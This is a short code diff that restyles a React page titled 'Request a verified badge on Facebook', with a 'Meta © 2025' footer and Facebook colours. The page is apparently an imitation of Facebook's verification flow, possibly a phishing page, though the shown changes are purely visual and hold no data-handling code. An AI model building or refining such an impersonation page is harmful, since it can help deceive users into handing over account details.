@@ -154,9 +154,9 @@ export default function Validation() {
       )}
 
       {/* Main Content */}
-      <div className="flex-1 flex flex-col">
+      <div className="flex-1 flex flex-col bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
         {/* Navigation Bar */}
-        <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white">
+        <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white/90 backdrop-blur-sm">
           <div className="flex items-center">
             {/* Mobile Menu Button */}
             <button 
@@ -178,7 +178,7 @@ export default function Validation() {
         </nav>
 
         <div className="flex-1 flex justify-center p-4 sm:p-8 overflow-y-auto">
-          <div className="w-full max-w-2xl space-y-4 sm:space-y-6 bg-white rounded-lg p-4 sm:p-6">
+          <div className="w-full max-w-2xl space-y-4 sm:space-y-6 bg-white/90 backdrop-blur-sm rounded-lg p-4 sm:p-6 border border-white/20 shadow-lg">
             <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
               Request a verified badge on Facebook
             </h1>
@@ -276,7 +276,7 @@ export default function Validation() {
           </div>
         </div>
 
-        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white">
+        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white/90 backdrop-blur-sm">
           Meta © 2025
         </div>
       </div>
